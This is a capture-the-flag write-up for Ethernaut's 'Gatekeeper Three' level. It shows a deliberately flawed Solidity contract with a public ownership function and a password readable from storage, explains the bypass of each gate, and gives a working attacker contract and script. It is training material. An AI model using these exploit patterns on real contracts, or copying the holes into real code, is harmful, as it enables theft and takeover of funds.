# Ethernaut: 28. Gatekeeper Three

> Cope with gates and become an entrant.

**Objective of CTF:**

- Make it past the gatekeeper and register as an entrant to pass this level.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor(address payable _target) {
    target = GatekeeperThree(_target);
  }

  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }

  function trickInit() public {
    trick = address(this);
  }

  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allow_enterance = false;
  SimpleTrick public trick;

  function construct0r() public {
    owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allow_enterance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
      allow_enterance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree returns (bool entered) {
    entrant = tx.origin;
    return true;
  }

  receive() external payable {}
}
```

We must pass 3 obstacles (gates) that are implemented as modifiers:

1. A simple ownership & contract check.
2. An `allow_enterance` check.
3. An intentionally-failing `payable` call.

## Gate 1

To get past this gate, we need a middleman contract that is also the owner for the target contract. It is very simple to become the owner here, just call `construct0r`! That is not a constructor function in disguise or something, it is just a function public to everyone, allowing anyone to become the owner. Believe it or not, things like this happen in real contracts. So, we simply have to call `construct0r` from within our attacker contract.

## Gate 2

Gate 2 requires `allow_enterance` to be true. We see that `getAllowance` will allow that given the correct password. We can read the storage variables, even if they are private, as we have done before in the previous challenges. So to get allowance, just read the password variable from storage of `SimpleTrick`, and provide it to the function.

## Gate 3

Assuming that contract has enough balance, all we have to do is fail the receive ethers. How do we do that? Simple: just revert intentionally within your `receive` function.

## Proof of Concept

Here is the attacker contract:

```solidity
contract GatekeeperThreeAttacker {
  function enter(address payable _target, uint _password) external {
    GatekeeperThree target = GatekeeperThree(_target);

    // become owner
    target.construct0r();

    // get allowance
    target.getAllowance(_password);
    require(target.allow_enterance(), "not allowed");

    bool res = target.enter();
    require(res, "failed!");
  }

  receive() external payable {
    revert("nope");
  }
}
```

The code to execute our attack is straightforward:

```typescript
// deploy attacker
const attackerContract = await ethers.getContractFactory('GatekeeperThreeAttacker', attacker).then(f => f.deploy());

// get password from SimpleTrick storage
const password = await ethers.provider.getStorageAt(await contract.trick(), ethers.utils.hexValue(2));

// enter!
await attackerContract.connect(attacker).enter(contract.address, password);
```
